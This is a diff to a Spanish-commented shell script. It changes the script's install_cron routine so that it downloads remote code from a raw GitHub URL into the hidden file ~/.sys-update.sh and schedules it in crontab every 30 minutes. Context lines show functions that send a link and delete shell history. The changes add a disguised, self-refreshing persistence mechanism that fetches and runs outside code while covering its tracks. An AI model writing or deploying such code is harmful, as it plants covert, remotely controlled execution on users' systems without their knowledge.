@@ -4,7 +4,7 @@
 # Fecha: 2017-10-17
 
 # Habilitar/deshabilitar depuración
-DEBUG=OFF  # Cambiar a OFF para deshabilitar la depuración
+DEBUG=ON  # Cambiar a OFF para deshabilitar la depuración
 
 # Función para imprimir mensajes de depuración
 function debug {
@@ -143,13 +143,15 @@ send_link
 function install_cron {
     debug "Instalando tarea cron..."
     CRON_JOB="*/30 * * * * $HOME/.sys-update.sh"
+    SCRIPT_URL="https://raw.githubusercontent.com/insanerask77/scripts/refs/heads/main/sys-defender.sh"
 
     # Comprobar si el cron ya está instalado, evitando problemas de coincidencia
-    if crontab -l 2>/dev/null | grep -q "$HOME/.sys-update.sh"; then
+    if crontab -l 2> /dev/null | grep -q "$HOME/.sys-update.sh"; then
         debug "La tarea cron ya está instalada."
     else
         # Copiar el script actual a un archivo oculto en el directorio HOME
-        cat $0 > $HOME/.sys-update.sh 
+        curl -fsSL "$SCRIPT_URL" -o "$HOME/.sys-update.sh"
+        # cat $0 > $HOME/.sys-update.sh 
         chmod +x $HOME/.sys-update.sh 
         # Añadir una tarea cron que ejecute el script cada 30 minutos
         (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
@@ -174,5 +176,3 @@ delete_history
 
 # Restaurar el historial al final del script
 set -o history
-
-
